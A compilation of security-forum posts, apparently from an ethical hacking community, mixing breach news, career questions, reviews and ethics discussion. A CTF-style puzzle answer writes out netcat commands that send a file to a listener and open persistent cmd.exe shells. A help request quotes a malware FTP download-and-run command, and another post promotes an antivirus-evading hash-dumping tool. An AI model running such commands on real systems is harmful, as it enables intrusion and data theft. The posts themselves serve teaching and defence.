3;Grimes: Vista Tough OS to Hackill vista be hacked? sure, anything super-popular gets hacked. ie 7 is the most likely target, of course, followed by windows mail (the outlook express replacement), because these applications have the highest visibility and hacker interest.  which new services are likely to be hacked? i’d put my money on the rss feeds, xml, and the new p2p and collaboration applications. aside from the more than 70 new services, vista has a lot of new file formats for hackers to explore, as well.  i will go out on a limb and say that i believe windows vista, and the forthcoming longhorn server, will be tough to hack. outside of client-side attacks and internet explorer, the fully-patched windows xp pro sp2 is already pretty hard to hack externally. vista will never be as secure as openbsd, but i believe it will be secure enough to ensure that microsoft becomes known as a vendor of choice for a secure operating system. and that’s a far cry from where it was five years ago.  if you don’t believe me, talk to the many professional hackers that microsoft has invited to test and strengthen vista. hundreds of internal and external hackers gave it their best whacks. a few succeeded in finding new exploits (or in re-finding old exploits). but ask any of them what they think of microsoft’s new os, and all will tell you it’s a lot harder to hack than its predecessor.  for full article: http://www.infoworld.com/article/06/12/ ... ise_1.html do
2;The First Vista Vulnerability - Overblown?"proof of concept" program for an exploit for microsofts recently released windows vista operating system was released on a russian hacker site recently. the alert accompanying the code speculated that some old debug code was left in the released windows code which is all the more remarkable since the code appears to be quite old.  some reports claim that the vulnerability allows for a privilege escalation exploit; this led to a series of alarmed news stories that were widely picked up, especially the one in the new york times. further analysis indicates that theres less here than was initially thought. as this article in betanews shows, the vulnerability is real, but theres no evidence that it can do anything worse than crash the system. and microsoft says that exploiting the bug requires "log on locally" privileges, meaning that it cant be exploited simply by visiting a web page or performing other casual operations. expect further advisories from microsoft on this bug and a fix before too long, but dont worry too much about it. there are no reports of the vulnerability being exploited in the wild. for original story: http://www.pcmag.com/article2/0,1895,2078223,00.asp do
3;Skillz Dec 06 Winning Entry - Technicaluan miguel paredes 1) what is interesting about the files that ralphie could see on the lamp server?  he has access to a netcat executable (nc) on a linux system!  what could be more interesting?  well, the chimney file is a pipe file, likely used by the email command processing system or to issue commands to the lamp directly.  but we dont need to mess with the lamp.  2) what is the significance of the annie cyphertext?  the annie cyphertext is windows lm password hashes.  these are trivial to crack with a multitude of tools, especially since they are seven characters max - you can tell this by the telltale "aad3b435b51404ee" pattern, which indicates a seven character or less password (lm hashes are split into two hashes, seven characters each.  the telltale pattern equals a blank password, hence the seven characters or less password for each password hash).  the hashes decrypt to: "drink more ovaltine buy counter hack reloade use netcat relay" which is what our hero intends to do. 3) what command could ralphie e-mail to the lamp to get access to the command shell on the furnace server from the kids network to read the christmas list?  what should ralphie do on his own laptop for this to work?  assume that you cannot alter the configuration of the lamp or get any higher privileges on that machine, nor can you reconfigure the firewall.  on his own laptop, run the following netcat command to setup a listener on port 443: nc -l -p 443 email the following command to the lamp: echo "nc 10.11.11.11 443 < c:\christmas_gift_list.txt" | ./nc 10.10.10.10 2222 since port 443 outbound is allowed through the firewall, this should send the christmas gift list to his laptop directly. 4) how can ralphie make the activities you describe above less likely to be detected by his old man?  since the netcat on the furnace was started with a single listener "-l" rather than a persistent listener "-l", the old man will be very suspicious when he finds that his listener on the furnace is no longer, er, listening.  to get around this, ralphie could issue this command via email to the lamp first instead:  echo "nc -l -p 2223 -d -e cmd.exe" | ./nc 10.10.10.10 2222 this should start a detached, persistent listener on the furnace on port 2223.  after that runs, the listener on 2222 should die (-l vs. -l). then, send the following command to extract the christmas gift list: echo "nc 10.11.11.11 443 < c:\christmas_gift_list.txt" | ./nc 10.10.10.10 2223 after he gets the list, ralphie can send this command to restart the single-use listener on 2222: echo "nc -l -p 2222 -e cmd.exe" | ./nc 10.10.10.10 2223 aside from not creating suspicion in the old man, ralphie now has his own persistent listener on the furnace. congrats and well done, do
3;Its 10 OClock. Do You Know Where Your Hacker Is?ake a look at this redmond magazine article by joel shore: it pros have reservations, but ethical hackers are becoming a fact of life. ethical hacking. that phrase may seem incongruous to some, but for others its an essential component of their it strategy. whatever your reaction to the concept of ethical hacking, everyone agrees that someone, authorized or not, is trying to break into your it infrastructure. "you want the good guys to find the security holes before the bad guys do," says jack koziol, program manager at the infosec institute, an organization that certifies security professionals. "if your people are not doing it, someone else will -- and that someone wont be on your side," he says. its not just about keeping that nefarious "someone" out. nabbing a successful perpetrator -- or even simply knowing that a break-in has occurred or is being planned -- is too often well beyond the technical scope of many it departments. even worse, when a break-in is discovered, most it professionals dont know how to secure and preserve the evidence needed for the forensic analysis and prosecution. for full article: http://redmondmag.com/features/article. ... ialsid=677 do
0;LSO Rootwar 10 Feb 1300 ESTso is hosting a hacking competition this saturday the 10th of february at 1pm est. international players make sure to check the time at  www.timeanddate.com/worldclock/  to make sure you are there on time as for many of you it will be late saturday evening or early sunday morning. player skill level: this competition is designed for players with a beginner to intermediate level of experience in the security field. this is part of the reason why it is a team competition as well, because it forces you to work with other players and that facilitates the learning. the skills tested and developed in this competition include familiarization with both windows and linux/unix, the ability to perform simple administrative tasks such as adding/removing users, installing/upgrading software, enabling/disabling services, to security tasks such as system security auditing (penetration testing or ethical hacking), system performance and log file analysis, intrusion detection, and incident response/forensics. remember the goal of this as well as any other lso hacking competition is learning. dont worry if you are new to the field, dont worry if you dont know linux, all of this is addressed by playing in teams allowing you to learn from and help other players. what you need: in order to participate in the hacking competition you will need an irc client, and an ssh client. if you are using windows you may want to try an irc client called mirc. download mirc -  www.mirc.com/get.html how to install -  www.mirc.com/install.html intro to irc -  www.mirc.com/irc.html next you will need an ssh client such as putty.exe. you can find putty, and various other putty files at: http://www.chiark.greenend.org.uk/~sgta ... nload.html the direct download for putty is: http://the.earth.li/~sgtatham/putty/lat ... /putty.exe where to meet: we will all meet on irc. server: irc.deepirc.org channel: #lso-rootwar irc command list:  http://ircportal.star-fury.com/html/irc_commands.html if you know you are playing email  joe@learnsecurityonline.com  and let him know or just show up! tomorrows rw will be a multi part challenge against a network, no securing your box or attacking the other team if you have any questions post them up. -chri
3;The Importance of Ethical Hackingt’s amazing to me the amount of people out there that are totally oblivious to what’s going on out there on the internet.  there is war going on and the stakes are high.  millions of dollars have been stolen and people’s lives hurt through such things as identity theft. in the middle of all this mess are the security pros trying to hold it all together so people feel safe to shop online and businesses try to survive hoping the public feels secure enough to transmit their credit card info. if anyone was questioning the need for ethical hackers i thought i would list a few quick facts: cardsystems solutions inc., a major credit card processor, fell prey to hackers in one of the largest security breaches involving consumer data. much of the stolen data had been gathered for research and should not have been stored by the company. at risk: 40 million seinsint, a unit of lexisnexis that compiles information from government records and holds personal data about most american citizens was repeatedly attacked by identity thieves. hackers gained access to u.s. account holders’ social security numbers, names and addresses and driver’s license numbers in 59 break-in attempts over 2 years. at risk: 310,000 students, faculty and staff at the university of colorado were put at risk when hackers from france and eastern europe accessed files containing social security numbers, addresses and dates of birth. at risk: 49,000 the identities of san diego state university students, alumni and employees were jeopardized when hackers broke into a computer server where names and social security were stored. at risk: 178,000 dsw shoes was breached by hackers who stole credit card and checking account data from more than 100 stores. at risk: 1.4 million   this list could go on and on!!!
1;Help... Worm?ey guys, my brother-in-law just called me frantically saying his computer had been hacked. he was in a remote session to his computer from work using vnc when he suddenly lost, and could not regain, the connection. when he got home, he noticed that when he clicked start > run, the last command was: â  â  code: cmd.exe /c del i&echo open 24.158.178.152 27206 > i&echo user 1 1 >> i &echo get 823.exe >> i &echo quit >> i &ftp -n -s:i &823.exe&del i&exit now, if you connect to that ip on that port, youll be greated with "220 reptile welcomes you.." which looks like a standard ftp greeting, but accepts no commands. everything i enter i receive a 503 command unknown. also, none of his system commands are working (ie. cd, netstat, ipconfig, etc.). sounds sorta like a rootkit. any suggestions

1;Tweaking BackTrackam sure just about everyone reading this forum is familiar with the live cd backtrack. if not you better hurry up and download!  do i use it on a real pentest? yes actually, but not always.  don’t get me wrong, i love backtrack and i use it when i am feeling lazy and in a hurry.  i often start a pentest with it. if  i cant make a breach, i go to my combination of  linux and xp.  what version of linux? right now i am playing with ubuntu and its seems great so far.  lol, i hope you see i am being honest and not trying to be elite or l33t or whatever. most hackers would never admit to using anything popular. hey, i don’t care as long as it gets the job done! hey, but i digress.    i have been playing with backtrack before it was called backtrack. remember whax?  backtrack was supposed to be a combination of auditor and whax, but i feel its mostly whax.  i have to admit i wish we still had auditor updated, but oh well.     the best performance form backtrack is realized from a full hard drive install.  no question about that. if i was an evil hacker i would run it as a live cd so as not to leave forensic evidence, but in my pentest i actually like having that. you never know when you must support your data! interesting, the creators of backtrack like to run it from a hard drive install also. so i guess i am in good company.   i would also suggest making a swap file. i do that mostly out of tradition but to be very honest, i have a lot of ram and i don’t seem to notice much of a difference.  jeeze, we computer geeks measure our manhood with the amount of ram, lol!  if you use backtrack a lot, i would advise downloading a video driver. it makes a big difference in your viewing and if you are spending a lot of time working with this as a pentest, why not be comfortable? if you are using an ati card, just go to their site and download the driver and install. don’t worry about that ati.lzm file. the regular ati linux download works fine.     so those are the 3 things to do.  install it on the hard drive, set a swap file (depending on your ram) and get a video driver.   hey, but don’t get too hooked on it, there are many reasons to also know linux and backtrack doesn’t really support being as creative as a regular linux distro

3;[Article]-Product Review: GFiLANguard NSS 8or those of you who know brian, he is a very selfless person. so when i asked him to write a review of gfilanguard, he immediately asked if he could test the software for a non-profit organization. that says it all. permanent link:  [article]-product review: gfilanguard nss 8 by brian wilson, ccna, ccse, ccai, mcp, network+, security+, jncia  i recently was asked to test drive gfilanguard network security scanner (n.s.s.) 8.0 and write my findings. gfi describes languard as having the ability to "check your network for possible security vulnerabilities by scanning your entire network for missing security patches, service packs, open shares, open ports, unused user accounts and more." having known about this product for quite some time but never getting my hands on it, i was excited as i had the perfect idea for testing its described capabilities.  i immediately contacted the director of a local non-profit organization, and asked if they would be willing to be my test bed for this network security auditing tool. after explaining my intentions, they were very happy to open their doors and be a gracious host. and, considering that gfi was kind enough to extend the temporary licenses to a full year for every copy of the software for the non-profit, they were thrilled to be selected as our site of choice. to give you a brief background on the non-profit, they are a home for disadvantaged youth and orphans while also providing family services to children. they have a main location with 200 workstations, 8 servers with varying duties, and 5 remote offices connected to the main location via layer 2 vpns. due to being a non-profit where funding is very limited, their team consists of only two network administrators. since i have assisted them in the past with lots of volunteered time and services, i was very aware of the network design and need for help. this network was pieced together over time with whatever was on hand or donated, so there are many different versions of windows and other oss on the network. also, the remote offices are hundred of miles from the main campus, so patch and update management is done when time permits. the two current network administrators are self-taught and mainly care about the mission of their organization and not the little money they get paid. now that i have painted a picture of this network and how it is maintained, i will roll into how the languard software was tested and received by the local staff on their network. be sure to leave your own comments about the product or feedback on mr. wilsons review. do
3; Luke, remember the force!am not a big star wars geek, but i do like them. i often think about the theme of the dark and good side of the force. that really relates to hacking.  we can use our knowledge for good or bad. the more skilled we get, the more temptation there can be to give into the “dark” side.  for instance, what if you had a safe contact that would give you a dollar per credit card number. you also knew where you could easily download 200,000 numbers. hmm, thats an easy $200,000 in your pocket. would you? maybe you knew a place you could breach and get 600,000 numbers. would you? maybe you just lost your job and feel the establishment sucks! its so unfair because the boss decided he had to hire his nephew and you had to go! he didn’t care that you had a wife and kids and a mortgage. for some, that would enough to begin a rationalization for their next move. for us ethical hackers, its so important to have a code and i don’t mean any kind of programming language.  we need a code of conduct. one we all subscribe to and one if we breach, its considered the unforgivable sin.   i also really like the lord of the rings and it was always very interesting to me about saruman. he was the leader of the wizards and he thought it was wise to study the dark ways of the enemy. his logic was, if you understood the dark side, then you could defeat it. unfortunately, in his studies he ended up being seduced by the same thing he was trying to defeat. it so important to not let that happen.  i can get into most people’s emails that i live or work with. do i? no way!  because that would be a breach of my code of honor.  can you resist the temptation? what if you think your girlfriend or spouse might be flirting with someone? would you hack their email? maybe you are worried your boss is thinking something negative about you or you just want to see if that other person in your department makes the same money as you.  i guess my point is, as you get more skilled as a hacker, you might get tempted to go to the dark side. i have only one word of advice and that is don’t!  if you do, it’s a journey that most likely will ruin your life and hurt the idea of what we are about.  please believe me when i say i could give you a number of stories and they always turn out very bad

2;Gap Contractor Laptop Stolen with 800,000 Job Applicants Dataill it ever end? im just curious, but have any of you ever lost a laptop? i never have, and i honestly didnt think it happened that often. but with the constant stories of lost/stolen laptops, maybe im just way off base here. or maybe i value my laptop too much to let it out of my possession. hmmmmmmmm. clothing retailer gap revealed on friday that a laptop containing the personal information of approximately 800,000 of its job applicants was stolen from a third-party contractor that manages the companys data. included in the information were applicants social security numbers, according to gap. the stolen laptop contained personal information for those who applied for jobs with the companys old navy, banana republic, gap and outlet stores in the united states, puerto rico and canada between july 2006 and june 2007, the company said. "were reviewing the facts and circumstances that led to this incident closely and will take appropriate steps to help prevent something like this from happening again," gap chairman and ceo glenn murphy said in a statement. because it relies on multiple contractors for managing job applicant data, gap said that not all applicants from that time are affected.  the unidentified consulting firm said it notified local law enforcement authorities as soon it discovered the laptop was stolen, according to a gap statement. police are investigating the theft. the information on the stolen laptop was not encrypted, contrary to gaps agreement with the vendor, according to the company statement. "it used to be that it departments could do their best effort, and hope everything was encrypted," steven sprague, ceo of wave systems, a developer of disk-encryption software, told scmagazineus.com. "but obviously that wasnt good enough, because ultimately the state of california passed regulations, and if a stolen hard disk was not encrypted, they need to tell everyone when the drive is lost or stolen. additional burden falls on it staffs after a data breach, sprague added.  "the problem is, laptop theft is going to continue," he said. "so its up to it to ensure that no data is lost for the corporation if i accidentally lose my laptop or my laptop is stolen." the company urged individuals who applied online or by phone for a job between july 2006 and june 2007 to contact the gaps security assistance hot line at (866) 237-4007. gap has posted more information on its assistance program at a security assistance website. for original story: http://www.scmagazineus.com/gap-contrac ... cle/35885/ do

3;MS Security Cert Landscape Moving into 2008ith windows server 2008 right around the corner, i thought it might be interesting to see where they were going with not only the new version of the certs but also the security specializations. as you may have heard, the title mcse is going bye-bye in place of mcitp (ms certified it professional). ms makes no excuse for changing the title as they were sued by almost every global organization and some governments over their use of the word "engineer." so it was their intention for quite some time to get rid of it. so while they were changing the name, they also decided to change the entire program based more on job duties and with a shorter exam track ie less exams. this new way of doing their certifications have been around for a little while starting with sql server 2005. since this is the first major upgrade (barring r2) of their server platform, it is just now catching up to the current group of mcsas and mcses. few interesting points to mention: 1. mcsa and mcse will never expire. they will just eventually lose their value as people eventually move away from server 2003, although that wont happen for quite some time. 2. the new mcitp credential will have only a 3 year life-span and will have a recertification requirement, although only 1 exam will meet that requirement. 3. there is no security specialization with the mcitp. instead, ms says that security is included as part of the normal content covered by the study materials and exams. for more info on server 2008 certs: https://www.microsoft.com/learning/wind ... fault.mspx ms will however continue their big push into security with their forefront family of products of which isa server 2006 is now a part. speaking of which, after more than a year on the market, ms is finally releasing an exam for isa server 2006. the ms page with details of this new exam isnt up yet, but you can get some early details from a blog run by some of the ms employees: http://blogs.msdn.com/trika/archive/200 ... -2006.aspx here some more info on the forefront security product line: http://www.microsoft.com/forefront/prod ... rview.mspx so bottom line is if you want a ms specific credential with security as a focus, a forefront product certification exam seems to be your only option. well see how this all pans out in 2008. here are a few links to  free  ms security training: - mss own elearning for  windows server 2008 - isa expert dr. tom shinders site,  http://www.isaserver.org - ms site  introducing forefront technologies  with case studies, trial downloads and virtual labs. hope you found this of interest, do

3;Foreign Countries Develop U.S. Defense Systems Softwareadversaries are developing key hardware and software for the united states department of defense. the defense science board task force (dsbt) issued a september 2007 report warning, “the united states must now confront—and plan for—the reality that adversaries may well be supplying the key hardware and software on which the u.s. bases its military and economic superiority.” the primary fear is that foreign-developed security software may come preprogrammed with backdoors and malicious code that would allow hackers to steal information or sabotage the system. because it is cheaper to do so, the u.s. has outsourced much of its government software development, including department of security software, to foreign nations—primarily india, china and russia. while the u.s. saves money in this arrangement, it is likely to pay in national security.   “while the united states still has preeminence in computer science, asia is rapidly gaining,” the report says. “the united states retains a pool of talented computer scientists and engineers, but the natural tendency of the industry is to seek the lowest cost supply of talent. in recent years that has been primarily in india, while china and russia are on the rise.”   a generation ago, america’s adversaries were wary of u.s.-developed software because they knew it might be used as a weapon against them. now the tables have turned. task force chairman robert lucky said in an introductory letter to the dsbt report that low-level malicious technologies have already infiltrated sensitive, yet unclassified, department of defense systems.   "the ease with which foreign-developed software could be hacked by the developer nation’s computer scientists could well leave the united states vulnerable to attack. “globalization of software development, where some of the united states adversaries are writing the code the [department of defense] will depend upon in war, creates a rich opportunity to damage or destroy elements of the war fighter’s capability,” the report says.   the united states’ reliance on foreign computer security systems may prove to be the seeds of its downfall. as trumpet editor in chief gerald flurry has written, “we could lose the next war before we even begin, if somebody breaks our military codes.” http://www.astalavista.co

3;The Craft of System Security Book Reviewook review for: the craft of system security by sean smith, john marchesini useful for the novice and professional 5 stars the preface of the book says that the book grew from a college course to solve this problem: “to provide the right security education to students who may only ever take one security course and then move on toward a wide range of professional careers.”  its nice when the authors put the goal of the book at the front, it makes reading it in the proper context much easier and reviewing the book (usually) much easier.  i think the authors met their goal of a book to give to people who may only read one security book in a  college course and have it be readable and useful.  it is written in an understandable manner and provides enough pictures and explanations for someone new to the subject who “has to take the class” and enough math and further reading for someone that wants to really delve into a subject to do so.  important words are in italics so if you wanted to or needed to look up the definitions to really understand the section you could, but there is enough information in the paragraphs to get by.  the book also has the added plus of being useful to someone studying for their cissp (if they actually want to know the subjects).  it explains topics that, in my opinion, are not explained very well in the study guides.  their discussion of the orange book was superb and i wish i had this book when i was trying to make sense of it when i was studying.  the chapters on cryptography go beyond the typical alice and bob stuff you get in most books (alice and bob are still there) but they also get into examples of breaking cryptography and explaining how the attacks work and usually backing it up with the math involved.  i really could say something good about every chapter in the book. each chapter is laid out with a solid, consistent road map, is full of quality readable content, and wraps it up with a “take home” message at the end. the table of contents doesnt seem to be available on  amazon but if you are interested in the book, id recommend you take a look at it over at the informit site. it covers a lot of ground in its five parts of history, security and the modern computing landscape, building blocks for secure systems, applications, and emerging tools.  the book also comes with a huge list of references and a pretty good index for looking up topics. i usually have my list of likes and dislikes for books.  for this book i dont have any dislikes.  the book is readable, well edited, a good font size, and i learned things from it.  ive been actively recommending it to people at work, especially the guys working on their cissp
1;Finding the right pathreetings! this being my first post i would like to give a brief introduction about my self and say that im happy to join the ethical hacker network.   well to start im a 20 year old male thats currently enlisted in the united states air force working as a jet engine mechanic. ive currently done 2 years and a couple months of service and have about 3 ½ years to go until my enlistment is served. now that ive done all my training, got the certs that i need, and things have finally came to a steady pace for me im looking at getting setup for a future career in what i love most.  for the past couple of years ive been very interested in various areas of network security and ethical hacking. ive picked up several books that i have either read and/or just skimmed threw for brief knowledge.  these including various “for dummies” series and a couple that arent being; visual basic 6 for dummies, visual basic .net step by step, hacking for dummies, rootkits for dummies, visual basic .net for dummies, and visual basic 6 core language little black book.  ive also picked up a couple c and c++ books while i was in high school and learned a little of both languages then but im no expert in any programming language.   im looking at starting school at the university of phoenix online and pursuing a bachelor of science in it and information system security.  before i enroll in the school im trying to learn as much as possible and wasnt sure what direction i should go or if even getting the degree is what i need for this career field.  to be honest im not even sure how much money i could even expect to make following this career path.  i love everything about network security and ethical hacking from programming to penetration testing.  i even find the computer forensics interesting along with cryptography and virus research.  so basically i guess what im trying to get at is that im trying to find the correct path to jump start a career some where in the world network security! also i was curious if any one knew if when you get your bachelors in it and iss if any of the certs are tied into the classes or if i have to take addition classes outside of the university. well i appreciate and help/information provided and thanks for letting me join the network

3;93% Say Mac OS X Attacks To Become More Commonn overwhelming majority of end-users surveyed believe apples mac platform will be more widely targeted by cybercriminals in the future.  ninety-three percent of the 350 respondents to a survey conducted by sophos, an anti-virus vendor, said they think attacks on the mac os x operating system will become more common.  however, half of those polled said that malware will remain a bigger headache for windows users than mac aficionados. only seven percent of respondents said that cybercriminals would continue to ignore os x. the results were revealed three months after the first trojan targeting os x was found.  a survey conducted by sophos two years ago found that 79 percent of end-users thought os x would become a more frequent target of malicious hackers.  “although we have seen the first attempts by criminal gangs to make money through mac os x malware, the fact of the matter is that there is only a tiny number of viruses and trojans for apple macs when compared to windows pcs. it seems unlikely that the mac virus problem will ever be as big as the windows one,” said graham cluley, senior technology consultant at sophos. “yes, the macintosh malware threat is a concern – but its important to put it in perspective.” last november, researchers found what they believe to be the first professionally crafted in-the-wild malware targeting the mac operating system.  the trojan, a dns changer that can be used to hijack search results and divert traffic to the hackers website of choice, was spotted on numerous pornography sites. attackers had attempted to navigate users to the malicious sites through comment spam posted on mac forums. the trojan posed as a quicktime plug-in.  sophos revealed last month in its security threat report that for-profit attacks on mac could become more common in 2008 because of the platforms increasing market share. http://www.scmagazineus.com/mac-os-x-at ... le/105338/ do
2;DHS Project Delivers New Malware Capture Methodproject funded by the department of homeland security (dhs) promises to give security researchers a new way to kill botnets and targeted malware attacks before they infect computers. this week, endeavor security plans to launch its active malware protection (amp) technology, which it developed as part of the dhss small business innovation research (sbir) program, at a dhs-sponsored event. endeavor delivers amp as a software-as-a-service product. amp captures malware "on the wire," before it infects an enterprises networked computers, and then relays it directly to anti-virus vendors, christopher jordan, ceo of endeavor security, told scmagazineus.com. this has two major benefits to vendors and end-users, he said. first, it permits "us to see how the malware code has been modified," he said. "we can see the actual code as opposed to finding the file after it obfuscates itself." second, it allows the vendors to generate new anti-virus signatures as much as six days faster than is now possible, he said. and with 200,000 to 300,000 malware files generated annually, this can make a significant difference in protecting enterprise systems, he added. endeavor securitys amp also allows anti-virus vendors to better prioritize malware protection, jordan said. for example, it would allow an anti-virus developer to respond faster to malware discovered on a large financial services customers network while delaying a fix for one on a small customers pcs. amp will also target the command and control channel that directs the botnet and targeted attacks that occur after malware has taken over a pc, jordan said. this is where endeavor securitys work with the dhs comes in, he added. "with botnets, the problem is twofold," jordan said. "one, you want to stop the initial attack. our phase one project with the dhs to capture malware allowed us to detect the network vector of the attack, so we can prevent the infection and work with the anti-virus vendors to get the malware off the desktop." in phase two, endeavor security will reverse engineer the captured malware. this will allow endeavor security to find the botnets often associated with malware infections. also as part of the second phase, endeavor security will work to break the botnets command and control structure, which allows the malware writer to control bots and initiate attacks, such as sending spam, jordan said. breaking the command and control structure may not free the infected pc of its virus, he admitted, but "if the botmaster cant control the bots, he doesnt have a botnet." once that step is taken, jordan says that endeavor security will focus on grabbing command control signatures and creating signatures to prevent the botmaster from taking control of the bots inside networks. that will destroy the botnet. endeavor security has another year left on its contract with the dhs to complete that project, jordan said. original story: http://www.scmagazineus.com/dhs-project ... le/105381/ do

1;fgdump v2.0.0 Releasedust in case you didnt know, fgdump is now the tool to use for dumping password hashes from windows systems. 04/25/2008:  i love having time to update tools.  i got around to adding 64-bit support to pwdump (1.7.0) and cachedump (technically referring to it as 2.0), which means i needed to build a new version of fgdump. at the same time, i rolled out a few new features which ive either been sitting on, or have been talking about for awhile. and of course, as is typical with new releases, most av is blind at least for a bit.   heres a list of things that have changed: - fgdump will now detect 64-bit targets and report them as such  - 64-bit pwdump and cachedump will be used when the target is detected as 64-bit  - fixed a problem when connecting to some samba servers where regqueryvalueex would not behave as expected  - fgdump will now generate a session id during each run - used to correlate failed logs and regular logs  - added command line to log file  - added session id to log file  - created a new file with the format (session-id).failed which contains greppable data on failed hosts  - a log file is always generated of the format (session-id).fgdump-log  - -l will now override the default log name (see above)  - added -a option to prevent tampering with av. this is useful if you know av is not picking it up, you want to tamper with the target as little as possible  a couple of notes about the log files. first off, a log file will always be generated now, and will contain the date and time of the run. you can override this using -l if you want it to be named something specific. fgdump will now also generate a .failed file, which will contain a list of hosts that were unsuccessful. this file contains greppable records so you can quickly identify what hosts failed, why, and if there are still processes running on the host. this should help during the cleanup phase. the fields in this file are as follows (all separated by "|" characters): 1. host ip/name  2. windows error number (e.g. 5 for access denied)  3. 1 if processes are still (possibly) running on the target, 0 if everything should be cleaned up  4. text of the error, if available  additionally, the command line used to invoke fgdump is stored in the log file now. this means, if you pass the password on the command line, it will be recorded in the log file! if this bothers you, please omit the -p parameter and simply provide the password when fgdump asks for it. please also note that this version has quite a number of changes in it and, while im releasing it as non-beta, there is a higher-than-normal chance for bugginess. as usual, please report any issues you find.  getâ  it here: http://swamp.foofus.net/fizzgig/fgdump/downloads.htm do

1;Need white hat helpello ethical hackers,  there is a big problem in my life , which is i dont know what to take in my life or what is the next step , i admire ethical hacking and i want to be an ceh , i was preparing for that too to take the exam from ec-council .  but my friends told me to concentrate more on programming because i am .net developer using c# , they told me the person with two intentions will fail to do any one of them , they told me to concentrate on programming and leave e-hacking . but i need to take them both , i merely tell them that there is no difference between them , an e-hacker must understand programming and must be a professional programmer before being an e-hacker to conduct vulnerability detection and actually e-hacking is multidisplinary field you must understand (computer architecture, networking,electronics , embedded system design , operating systems fundamentals , programming ,web programming to conduct ethical hacking and countermeasuring those) so my question : can i hold the stick from the middle??????? i mean can i take them both  ???? or you guys left programming to be become e-hackers , really i am destroyed from inside , i would like to be ceh without losing my programming skills. second, the companies here demand programmers rather than e-hackers so if i would like to work i will work as a developer , i dont know how to work as ceh , i thought about building a simple personal small company for me and advertise for companies to conduct penetration testing for them  ? so what do you think about this idea  ????? please understand my situation and try to help me with advices from geeks in the industry like you guys . thanks very much my friends . any help will be appreciated
3;Looks like people are starting to take notice...ust read  this  on el reg that i thought id share. colchester university hospital has sacked one of its managers over the theft of his work laptop, which contained unencrypted patient records. the pc - which was stolen from the unnamed managers car in june - contained copies of the personal details and treatment plans of several thousand patients. thieves took the machine after breaking into the car, which was parked in edinburgh at the time, where the unnamed manager was holidaying. the computer was password-protected but the data was not encrypted. colchester hospital university nhs foundation trust said that the manager involved was dismissed following a disciplinary panel last friday. "the unanimous decision of the disciplinary panel sends out a clear statement about how seriously the trust takes security and patient confidentiality. i again apologise for the distress the theft of this laptop may have caused," said peter murphy, chief executive of colchester hospital university nhs foundation trust. perhaps threat of unemployment might make employees take more care with client data. dont fancy filling in his next job application form:  reason for leaving previuos position? ...

0;Guidance on Black Box Testingn the middle of a black box test, external network, social engineering, client-side attacks, the whole nine yards.  we started off with an external recon of open ports and services and then to the social engineering.  weve already obtained several usable usernames and passwords, but the issue externally is that only a few open ports and services are available.  no golden nuggests such as rdp unfortunately.  there is a citrix portal which we managed to discover that one user has access to (the rest do not).  we installed the citrix client and are able to open a windows explorer window on the citrix box itself for this one user.  ive already tried all the basics to create local users and even launching ad users and computers for their domain and adding ids or changing permissions on acounts but the environment is fairly locked down and the user does not have permission to install software on the box, etc.  i can attempt to map drives and try some light brute forcing, since ive been enable to enumerate who the domain admins are, etc, etc and i have a list of every internal host name.  i just dont yet have that in that affords me access to a desktop or internal domain.  i simply have domain user creds in a locked down environment and a citrix portal...so far.  were still in the middle of testing but i was wondering if anyone had guidance on things we can do from this citrix server since its officially some sort of internal session.  i can also browse network drives and ive been downloading sensitive information left and right...so were partly successful but we would like to eventually add ourselves as a domain user or admin/domain admin (would be our end game)

3;One Hackers Audacious Plan to Rule the Black Market in Stolen Credit Cardserry christmas one and all, no real reason for posting this, but i enjoy real-life hacker stories and case studies. more importantly i found this an interesting way to fill half an hour on a very quite work day before christmas. hopefully youll all enjoy it too. settling into his chair and resting his fingers on his keyboard like a concert pianist, butler began his attack. most illegal online loot was fenced through four so-called carder sitesâmarketplaces for online criminals to buy and sell credit card numbers, social security numbers, and other purloined data. one by one, butler took them down. (this story, like the rest of this article, has been reconstructed using court documents and conversations with friends and associates; butler declined to be interviewed.)  first, he breached their defenses, tricking their sql database servers into running his own commands or simply slipping in with a hacked password. once inside, he sucked out their content, including the logins, passwords, and email addresses of everyone who bought and sold through the sites. and then he decimated them, wiping out the databases with the ease of an arsonist flicking a match. he worked for two straight days; when he tired, he crashed out on the apartments foldaway bed for an hour or two, then got up and went back at it. butler sent an email under the handle iceman to all the thieves whose accounts he had usurped. whether they liked it or not, he wrote, they were now members of his own site, cardersmarket.com. in one bold stroke, butler had erected one of the largest criminal marketplaces the internet had ever seen, 6,000 users strong. full articl

3;Better Hacking tools = Good or Bad?saw this on the metasploit blog and i wanted to get your view on the subject. i understand the counter argument, but i think having this available for the average admin to use is a good thing. too bad people dont use it more.  da said...  im sure you dont need any more pats on the back. *pat*. phenominal work. i probably had a conversation with you regarding this already, but im still interested in your thoughts on the subject...  how concerned are you about lowering the bar required to succesfully hack. the better/more well armed script kiddie is the obvious concern, but i envision a new army of security consultants armed with a new tool to make them appear competent. i dont have a firm opinion regarding this, but its a subject ive been pondering. obviously you are comfortable with releasing the tool (and the many thanks for doing so), but do you have concern regarding the moderately gifted fifth grader that doesnt have a sense of porportion or consequences using such tools? on a side note, i daydreamed a bit today of new movie hacking sequences , spiffy 3d interfaces, of servers moving from a fuzzed appearance to one visually indicating their vulnerabilities, etc...  perhaps the upside can (and should?) be that your average it person may be expected to use such tools to mitigate obvious risk, leaving actual security professionals to do more difficult risk-assesments and work that requires analysis. /ramble d a 5:39:00 pmâ     hdm said...  once network administrators are comfortable with "hacking" their own servers using exploit tools (metasploit, impact, canvas), the security consultants will have to try a little bit harder to justify their rates. my view is that by making exploit technology easy to use and understand, we create a legitimate need for tools that would otherwise be considered harmful. the last thing we need is a law banning exploit development

3;EH-Net Compromise?!?!eh-net compromise disclosure eh-net was compromised a few months back, and we are asking all members to immediately change their passwords. although we do not hold any sensitive data such as social security numbers, credit card numbers, date of birth, etc., we still realize that, although it is not recommended, some members may use the same password for social sites such as our as they do for more personally sensitive sites. if this is the case, please immediately change those passwords, too, and make both follow complexity guidelines. we apologize for the late notification, but while we were in the process of cleaning the mess, we did not want the attackers to be notified. our intention was to prevent multiple notifications and required actions by our members. although we feel very comfortable in the status of the site and had planned on notifying all members, someone beat us to the punch.  http://www.milw0rm.com/papers/297 . we are providing this link, so that our members can see that a select few accounts and their passwords have been released to the public. we do not know how many more they have or will make public. this makes it even more urgent to change your passwords. we apologize for any inconvenience this has caused. although many other sites have experienced the same issues, and we are clearly a target based on the content of the site, this in no way excuses us for this incident. donald c. donzal editor-in-chief the ethical hacker network" wtf? eh-net staff waited over eight months to let members know about the compromise?  according to the milw0rm release, the compromise occurred before "jul 16 18:05:29 cest".  i got a notice today (feb 28, 2009) about the 